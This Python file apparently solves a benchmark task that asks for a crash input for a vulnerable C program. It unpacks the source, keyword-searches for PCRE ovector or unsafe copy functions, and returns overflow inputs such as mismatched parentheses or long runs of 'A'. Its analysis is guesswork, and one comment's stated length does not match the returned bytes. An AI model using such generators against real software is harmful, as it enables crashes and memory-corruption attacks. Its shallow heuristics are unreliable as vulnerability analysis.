import tarfile
import tempfile
import subprocess
import os
import re

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract and analyze the source code
        with tempfile.TemporaryDirectory() as tmpdir:
            # Extract tarball
            with tarfile.open(src_path, 'r:*') as tar:
                tar.extractall(tmpdir)
            
            # Find C source files
            c_files = []
            for root, dirs, files in os.walk(tmpdir):
                for file in files:
                    if file.endswith('.c'):
                        c_files.append(os.path.join(root, file))
            
            if not c_files:
                # Fallback: generate minimal PoC based on problem description
                # The vulnerability description suggests a regex/parsing issue
                # with capturing parentheses and ovector (PCRE-like)
                # Ground truth length is 8 bytes, so create pattern that triggers overflow
                return b"(())))\x00"
            
            # Analyze vulnerability pattern from source
            vulnerability_pattern = self.analyze_source(c_files)
            if vulnerability_pattern:
                return vulnerability_pattern
            
            # Fallback to known pattern for stack buffer overflow with parentheses
            # Create pattern that has mismatched parentheses to trigger buffer overflow
            return b"((()))\x00\x00"
    
    def analyze_source(self, c_files):
        """Analyze C source files to identify vulnerability pattern."""
        for c_file in c_files:
            with open(c_file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            # Look for patterns indicating regex/parsing vulnerabilities
            patterns = [
                r'ovector\s*\[.*\]',  # Ovector array
                r'pcre.*exec',        # PCRE functions
                r'captur',           # Capturing parentheses
                r'paren',            # Parentheses
                r'stack.*overflow',  # Stack overflow comments
                r'buffer.*overflow', # Buffer overflow comments
            ]
            
            found_patterns = []
            for pattern in patterns:
                if re.search(pattern, content, re.IGNORECASE):
                    found_patterns.append(pattern)
            
            # If we find regex/parsing related code, generate appropriate PoC
            if any('ovector' in p.lower() or 'pcre' in p.lower() or 'captur' in p.lower() 
                   for p in found_patterns):
                # Create pattern with mismatched parentheses to trigger ovector overflow
                # Based on vulnerability description: fewer capturing parentheses than ovector space
                return b"(())))\x00"
            
            # Look for fixed size buffers and copy operations
            buffer_patterns = [
                r'char\s+\w+\s*\[(\d+)\]',  # Char arrays
                r'strcpy\s*\(',             # strcpy calls
                r'strncpy\s*\(',            # strncpy calls
                r'memcpy\s*\(',             # memcpy calls
                r'gets\s*\(',               # gets calls (very dangerous)
            ]
            
            for pattern in buffer_patterns:
                matches = re.findall(pattern, content)
                if matches:
                    # Found buffer operations, create overflow pattern
                    if 'gets' in pattern:
                        # gets is particularly vulnerable - just needs to overflow buffer
                        return b"A" * 256  # Large buffer to trigger overflow
                    elif any(p in pattern for p in ['strcpy', 'memcpy']):
                        # Find buffer sizes
                        size_matches = re.findall(r'\[(\d+)\]', content)
                        if size_matches:
                            try:
                                size = max(int(s) for s in size_matches if int(s) < 1000)
                                return b"A" * (size + 100)  # Overflow by 100 bytes
                            except:
                                pass
        
        return None